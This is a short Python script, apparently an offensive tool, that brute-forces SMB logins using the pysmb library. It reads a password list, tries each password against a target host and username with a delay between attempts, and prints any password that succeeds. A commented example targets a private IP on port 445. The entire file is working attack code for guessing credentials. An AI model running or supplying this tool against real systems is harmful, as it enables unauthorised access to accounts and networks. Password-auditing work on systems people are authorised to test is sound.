from smb.SMBConnection import SMBConnection
from time import sleep

def smbConnection(server_ip, username, password, port, client_machine):
    try:
        conn = SMBConnection(username, password, client_machine, server_ip, use_ntlm_v2=True)
        connected = conn.connect(server_ip, port)
        if connected:
            conn.close()
            return 0
        else:
            conn.close()
            return 1
    except Exception as e:
        print(f"Exception occurred: {e}")
        return 2

def smbBruteForce(address, username, passlist, port, delay):
    with open(passlist, "r") as password_list:
        for password in password_list.readlines():
            password = password.strip("\n")
            response = smbConnection(address, username, password, port, "client_machine_name")
            if response == 0:
                print(f"[*] Username: {username} | [*] Password found: {password}\n")
                break  # Stop brute-forcing once the correct password is found
            elif response == 1:
                print(f"[*] Username: {username} | [*] Password: {password} | Incorrect!\n")
                sleep(delay)
            elif response == 2:
                print("[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]")
                break

# Example usage
# smbBruteForce("192.168.1.1", "username", "passwords.txt", 445, 1)
